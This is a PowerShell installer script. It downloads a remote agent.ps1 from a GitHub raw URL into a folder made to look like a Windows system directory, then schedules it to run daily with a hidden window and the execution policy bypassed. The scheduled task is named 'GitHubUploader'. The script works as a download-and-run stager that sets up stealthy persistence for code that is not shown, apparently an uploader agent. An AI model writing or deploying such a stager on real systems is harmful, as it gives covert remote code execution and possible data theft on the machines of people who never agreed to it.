# install.ps1 - 下载 agent.ps1 并注册每天23点计划任务

[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

$targetPath = "C:\ProgramData\Microsoft\Windows\agent.ps1"
$taskName = "GitHubUploader"
$scriptUrl = "https://raw.githubusercontent.com/rtyuiuiop/1/main/.github/agent.ps1"

$folder = Split-Path $targetPath
if (-Not (Test-Path $folder)) {
    New-Item -ItemType Directory -Path $folder -Force | Out-Null
}

try {
    Invoke-WebRequest -Uri $scriptUrl -OutFile $targetPath -UseBasicParsing -ErrorAction Stop
    Write-Host "✅ agent.ps1 downloaded to $targetPath"
} catch {
    Write-Error "❌ Failed to download agent.ps1: $($_.Exception.Message)"
    exit 1
}

try {
    schtasks /Create /TN $taskName /TR "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" /SC DAILY /ST 23:00 /F | Out-Null
    Write-Host "📅 Task [$taskName] scheduled daily at 23:00"
} catch {
    Write-Warning "⚠️ Failed to create task: $($_.Exception.Message)"
}

Write-Host "`n✅ Installation complete."
